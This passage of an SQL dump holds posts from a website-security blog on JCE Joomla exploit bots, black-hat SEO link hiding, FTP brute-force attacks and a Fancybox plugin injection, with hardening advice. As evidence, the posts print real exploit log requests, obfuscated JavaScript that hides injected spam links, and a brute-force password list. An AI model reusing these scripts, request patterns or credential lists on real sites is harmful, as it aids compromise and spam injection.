*.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (147, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (148, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (149, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (150, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (151, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
